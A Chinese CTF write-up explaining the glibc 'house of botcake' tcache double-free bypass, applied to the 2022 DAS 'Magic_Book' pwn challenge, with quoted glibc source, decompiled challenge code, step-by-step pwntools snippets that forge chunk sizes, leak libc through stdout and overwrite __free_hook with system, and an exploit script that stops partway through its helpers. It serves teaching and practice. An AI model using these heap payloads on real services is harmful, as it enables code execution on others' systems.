<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="cea9cbe8fa6adb3896187dc2012ab403">house of botcake &amp; Tcache Double Free学习利用</h1>
<h3 data-content="1" id="fed3f155ee61d5cfcf4832b2538e3291">house of botcake介绍：</h3>
<blockquote>
<p>高版本unsortedbin中double free打tcache poisoning：</p>
<p>Glibc 2.29版本新增了Tcache Key机制来应对Tcache Double Free，house of botcake是利用UAF漏洞将Chunk存入Unsorted bin中，绕过Tcache Key机制的检查进行Double Free，使得Chunk再次存入到Tcache bin中</p>
</blockquote>
<p>‍</p>
<h4 data-content="1" id="45c073ee612a21b6a453a1372f37e86f">利用条件:</h4>
<blockquote>
<ul>
<li>存在 UAF 漏洞</li>
<li>可以进行至少两次 Free 操作</li>
</ul>
</blockquote>
<p>‍</p>
<h4 data-content="1" id="726de7b523fe54d3a90ab70546beb074">源码分析：</h4>
<p>Tcache Key机制介绍</p>
<div class="highlight"><pre><span></span><span class="n">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">!=</span> <span class="n">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="o">.</span><span class="n">tcache_bins</span><span class="p">)</span>
      <span class="p">{</span>
    <span class="o">/*</span> <span class="n">Check</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">it</span><span class="s1">'s already in the tcache.  */</span>
    <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>

    <span class="o">/*</span> <span class="n">This</span> <span class="n">test</span> <span class="n">succeeds</span> <span class="n">on</span> <span class="n">double</span> <span class="n">free</span><span class="o">.</span>  <span class="n">However</span><span class="p">,</span> <span class="n">we</span> <span class="n">don</span><span class="s1">'t 100%</span>
       <span class="n">trust</span> <span class="n">it</span> <span class="p">(</span><span class="n">it</span> <span class="n">also</span> <span class="n">matches</span> <span class="n">random</span> <span class="n">payload</span> <span class="n">data</span> <span class="n">at</span> <span class="n">a</span> <span class="mi">1</span> <span class="ow">in</span>
       <span class="mi">2</span><span class="o">^&lt;</span><span class="n">size_t</span><span class="o">&gt;</span> <span class="n">chance</span><span class="p">),</span> <span class="n">so</span> <span class="n">verify</span> <span class="n">it</span><span class="s1">'s not an unlikely</span>
       <span class="n">coincidence</span> <span class="n">before</span> <span class="n">aborting</span><span class="o">.</span>  <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache</span><span class="p">))</span>
      <span class="p">{</span>
        <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
        <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
         <span class="n">tmp</span><span class="p">;</span>
         <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">-&gt;</span><span class="nb">next</span><span class="p">)</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s2">"free(): double free detected in tcache 2"</span><span class="p">);</span>
        <span class="o">/*</span> <span class="n">If</span> <span class="n">we</span> <span class="n">get</span> <span class="n">here</span><span class="p">,</span> <span class="n">it</span> <span class="n">was</span> <span class="n">a</span> <span class="n">coincidence</span><span class="o">.</span>  <span class="n">We</span><span class="s1">'ve wasted a</span>
           <span class="n">few</span> <span class="n">cycles</span><span class="p">,</span> <span class="n">but</span> <span class="n">don</span><span class="s1">'t abort.  */</span>
      <span class="p">}</span>
</pre></div>
<p>被free的堆块进入unsorted bin中，避免了key的生成。当堆块再次free进入tcache后，就绕过了Tcache Key机制的检查，从而能够实现高版本的tcache double free</p>
<p>‍</p>
<p>‍</p>
<h3 data-content="1" id="f0c37ad5db1c726b59577b6509bf35ec">2022DAS10Y  Magic_Book</h3>
<h5 data-content="1" id="fa30edcf1438aca2df716efd0be423bb">静态分析：</h5>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/shu/mypwn/House of house/house of botcake/Magic_Book/pwn'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
</pre></div>
<p>程序没有edit函数和show函数，然后有只能用一次的UAF漏洞。对申请的字节数还有限制，最大为0x100</p>
<div class="highlight"><pre><span></span><span class="n">void</span> <span class="n">__fastcall</span> <span class="n">__noreturn</span> <span class="n">main</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="n">eax</span>
  <span class="nb">int</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
  <span class="nb">int</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>

  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="n">setbuf_0</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">;</span>
  <span class="n">book_of_wishes</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">menu</span><span class="p">();</span>
      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s2">"</span><span class="si">%d</span><span class="s2">"</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v5</span> <span class="o">!=</span> <span class="mi">9</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">delete_uaf</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">add</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">delete</span><span class="p">();</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">delete_uaf</span><span class="p">()</span>
<span class="p">{</span>
  <span class="nb">int</span> <span class="n">idx</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_4054</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">"Wrong!</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_idx</span><span class="p">();</span>
  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4060</span> <span class="o">+</span> <span class="n">idx</span><span class="p">));</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)</span><span class="o">++</span><span class="n">dword_4054</span><span class="p">;</span>
<span class="p">}</span>


<span class="nb">int</span> <span class="n">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="nb">int</span> <span class="n">result</span><span class="p">;</span> <span class="o">//</span> <span class="n">eax</span>
  <span class="nb">int</span> <span class="n">v1</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_4050</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">"There is now an opportunity to withdraw, but sometimes..."</span><span class="p">);</span>
    <span class="o">++</span><span class="n">dword_4050</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">dword_405C</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_405C</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">read_idx</span><span class="p">();</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mh">0x11</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="err">!</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4060</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s2">"Wrong!</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4060</span> <span class="o">+</span> <span class="n">result</span><span class="p">));</span>
      <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4060</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s2">"Done!</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<h5 data-content="1" id="6846103e80216d60d2529a546dcb5203">动态调试：</h5>
<p>这题如果单纯的打house of botcake，那么后续只能打io leak泄露一个堆地址。如果想第二次打tcache poisoning的话，就必须要进行一点布局</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'b'</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'c'</span><span class="p">)</span>
    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#size and prev_size of unsigned bin to be forged</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162844-27dee414-845a-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162850-2b91ef52-845a-1.png"/></p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> 

    <span class="n">uaf</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></div>
<p>将 chunk3-10 delete来把tcachebin填满</p>
<p>free掉chunk1，再将chunk0 delete来与chunk1合并</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162913-3936009e-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="c1">#take one from tcache bin</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#double free</span>
</pre></div>
<p>原chunk1 double free</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162921-3de20ef8-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="c1">#let the fd pointer of unsorted bin local tcache bin</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">'</span><span class="se">\xa0\x46</span><span class="s1">'</span><span class="p">)</span><span class="c1">#stdout struct</span>
</pre></div>
<p>申请不同于0x100大小的堆块来分割unsortedbin</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162927-415b31b8-845a-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162931-4393a3ac-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#tamper size of unsorted bin</span>
</pre></div>
<p>原chunk1剩余的部分杯篡改为0x180大小</p>
<p>我们先前对chunk4的布置，伪造的prev_size和size</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162937-47364942-845a-1.png"/></p>
<p>‍</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162942-4a97e276-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1887</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#io leak</span>
</pre></div>
<p>io leak泄露libc地址</p>
<p>‍</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116162953-50d6d69c-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">delete</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#second tcache poisoning</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163029-664d8598-845a-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163034-691bbba0-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0xb0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163041-6d8cddb8-845a-1.png"/></p>
<p>‍</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">))</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163047-70fb2112-845a-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163051-73c772f6-845a-1.png"/></p>
<p>‍</p>
<h5 data-content="1" id="bd55e359893f1906f84fc39104f1e1ae">exp：</h5>
<div class="highlight"><pre><span></span><span class="c1"># encoding = utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.rop</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.context</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.fmtstr</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.util.packing</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.gdb</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="c1"># from ae64 import AE64</span>
<span class="c1"># from LibcSearcher import *</span>

<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
<span class="c1"># context.arch = 'i386'</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">li</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;214m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">ll</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;1m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">pause</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Size: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"Content: "</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">uaf</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
